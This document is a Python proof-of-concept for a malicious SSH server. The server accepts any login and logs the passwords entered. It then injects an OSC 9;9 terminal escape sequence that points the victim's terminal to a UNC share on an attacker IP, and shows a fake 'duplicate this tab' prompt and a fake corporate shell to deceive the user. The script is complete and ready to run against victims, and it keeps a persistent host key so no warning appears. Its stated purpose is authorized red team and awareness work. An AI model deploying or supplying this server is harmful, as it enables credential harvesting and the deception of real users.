#!/usr/bin/env python3
r"""
PoC: Malicious SSH Server - OSC Escape Sequence + Duplicate Tab Instruction

This server accepts any SSH connection (any username/password),
sends the specific OSC escape sequence:
    \x1b]9;9;\\ATTACKER_IP\share\x1b\

and then displays a message instructing the victim to
"open a duplicate tab".

Intended for security research, red team exercises, and
authorized penetration testing / awareness training ONLY.

Do NOT use this against systems or people without explicit written permission.
Misuse may be illegal.

Usage:
    python3 poc_ssh_server.py --port 2222 --ip 10.10.14.5

Victim connects with:
    ssh -p 2222 user@attacker-ip
    (any password works)

Requirements:
    pip install paramiko
"""

import paramiko
import socket
import threading
import argparse
import os
import time

from paramiko import RSAKey

KEY_FILE = "ssh_host_rsa_key"
host_key = None  # will be set in start_server


class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        print(f"[+] Login attempt: username='{username}' password='{password}'")
        # PoC: accept everything
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_publickey(self, username, key):
        print(f"[+] Publickey auth attempt: username='{username}'")
        return paramiko.AUTH_SUCCESSFUL

    def get_allowed_auths(self, username):
        return "password,publickey"

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        # modes is a bytes object with encoded terminal modes (newer paramiko versions pass this)
        return True


def handle_client(client_sock, client_addr, attacker_ip):
    print(f"[*] New connection from {client_addr[0]}:{client_addr[1]}")

    transport = paramiko.Transport(client_sock)
    transport.add_server_key(host_key)

    server = Server()
    try:
        transport.start_server(server=server)
    except paramiko.SSHException as e:
        print(f"[-] SSH negotiation failed with {client_addr[0]}: {e}")
        return

    # Get the channel (usually the shell)
    chan = transport.accept(30)
    if chan is None:
        print(f"[-] No channel from {client_addr[0]}")
        return

    # Wait until client requests a shell/PTY
    server.event.wait(10)
    if not server.event.is_set():
        print(f"[-] Client {client_addr[0]} did not request a shell")
        chan.close()
        transport.close()
        return

    print(f"[+] Shell opened for {client_addr[0]}. Injecting payload...")

    # === THE PAYLOAD ===
    # Sends OSC 9;9 with proper UNC path \\IP\share
    sequence = f"\x1b]9;9;\\\\{attacker_ip}\\share\x1b\\"

    try:
        # 1. Send the raw escape sequence first (this is the important part)
        chan.send(sequence.encode("utf-8", errors="ignore"))

        # 2. Send a clean, natural-looking message (short lines so it doesn't wrap like crap)
        chan.send(b"\r\n")
        chan.send(b"To continue, please duplicate this tab.\r\n")
        chan.send(b"\r\n")
        chan.send(b"   Ctrl + Shift + D   or   right-click tab -> Duplicate\r\n")
        chan.send(b"\r\n")
        chan.send(b"Thanks.\r\n")
        chan.send(b"\r\n")

        # 3. Fake prompt
        chan.send(b"session@corp-server:~$ ")

        # 4. Simple fake shell - line buffered so it doesn't spam on every keystroke
        buffer = b""
        while True:
            data = chan.recv(1024)
            if not data:
                break
            buffer += data

            # Process complete lines only
            while b"\n" in buffer or b"\r" in buffer:
                # Split on first newline or carriage return
                if b"\n" in buffer:
                    line, buffer = buffer.split(b"\n", 1)
                else:
                    line, buffer = buffer.split(b"\r", 1)

                cmd = line.decode("utf-8", errors="ignore").strip()

                if cmd.lower() in ["exit", "quit", "logout", "close"]:
                    chan.send(b"\r\nGoodbye.\r\n")
                    return  # close connection
                elif cmd.lower() == "help":
                    chan.send(b"\r\nCommands: exit, help\r\nsession@corp-server:~$ ")
                elif cmd == "":
                    chan.send(b"\r\nsession@corp-server:~$ ")
                else:
                    chan.send(
                        f"\r\nbash: {cmd}: command not found\r\nsession@corp-server:~$ ".encode(
                            "utf-8", errors="ignore"
                        )
                    )

    except Exception as e:
        print(f"[-] Error handling channel for {client_addr[0]}: {e}")
    finally:
        try:
            chan.close()
        except:
            pass
        try:
            transport.close()
        except:
            pass
        print(f"[*] Connection from {client_addr[0]} closed.")


def start_server(port: int, attacker_ip: str):
    global host_key

    # Persistent host key so victims don't get "host changed" warnings on re-runs
    if os.path.exists(KEY_FILE):
        host_key = RSAKey(filename=KEY_FILE)
        print(f"[*] Loaded host key from {KEY_FILE}")
    else:
        print("[*] Generating new 2048-bit RSA host key (first run)...")
        host_key = RSAKey.generate(2048)
        host_key.write_private_key_file(KEY_FILE)
        print(f"[*] Host key saved to {KEY_FILE}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(("", port))
        sock.listen(100)
    except OSError as e:
        print(f"[-] Cannot bind to port {port}: {e}")
        print("    Try a different port with --port or run with sudo for port < 1024")
        return

    print(f"[*] Listening on 0.0.0.0:{port}")
    print(f"[*] UNC path in OSC: \\\\{attacker_ip}\\share")
    print(f"[*] Victim command: ssh -p {port} anyuser@YOUR_IP")
    print("[*] Any username/password accepted (attempts are logged)")
    print()

    try:
        while True:
            client, addr = sock.accept()
            t = threading.Thread(
                target=handle_client, args=(client, addr, attacker_ip)
            )
            t.daemon = True
            t.start()
    except KeyboardInterrupt:
        print("\n[*] Ctrl+C received, shutting down...")
    finally:
        sock.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="PoC SSH server that injects OSC 9;9 escape sequence and tells victim to duplicate tab"
    )
    parser.add_argument(
        "-p", "--port", type=int, default=2222,
        help="Port to listen on (default: 2222). Use 22 only with sudo."
    )
    parser.add_argument(
        "-i", "--ip", type=str, default="192.168.1.100",
        help="Attacker IP to put into the \\\\IP\\\\share path (default: 192.168.1.100)"
    )
    args = parser.parse_args()

    start_server(args.port, args.ip)
